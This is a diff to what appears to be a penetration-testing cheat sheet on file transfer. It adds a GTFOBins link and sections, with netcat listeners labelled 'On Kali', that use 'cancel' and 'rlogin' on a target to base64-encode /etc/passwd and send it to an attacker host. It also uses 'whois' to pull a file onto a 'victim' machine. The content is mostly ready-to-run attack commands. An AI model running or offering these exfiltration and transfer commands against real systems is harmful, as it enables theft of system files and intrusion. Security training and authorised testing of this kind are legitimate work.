@@ -1,4 +1,8 @@
 - - -
+###### If noting works may this work :
+- https://gtfobins.github.io/#+file%20upload
+
+- - -
 ### Python web-server
 
 **<u>Attacker</u>** :
@@ -129,3 +133,51 @@ fetch http://IP_ADDR/file
 <br>
 
 - - -
+
+### With "Cancle" and "rlogin" command : 
+
+###### On Kali : 
+
+```sh
+nc -nlvp 18110
+```
+
+###### On Target :
+
+```sh
+cancel -u "$(cat /etc/passwd | base64)" -h <ip>:<port>
+```
+
+**Or** 
+
+```sh
+rlogin -l "$(cat /etc/passwd | base64)" -p <port> <ip>
+```
+
+- - -
+
+### With WHOIS Command : 
+
+###### On kali : 
+
+```sh
+cat file.txt | nc -vv -l -p 8000
+```
+
+###### On Victim : 
+
+```sh
+whois -h 127.0.0.1 -p 8000 "gimmehell" > newfile.txt
+```
+
+
+![Imgur](https://i.imgur.com/D9PHKHB.png)
+
+Now,  on the victim machine After file successfully transfered. Press **CTRL+^C**
+
+![Imgur](https://i.imgur.com/JLBW5jL.png)
+
+- - -
+
+
+
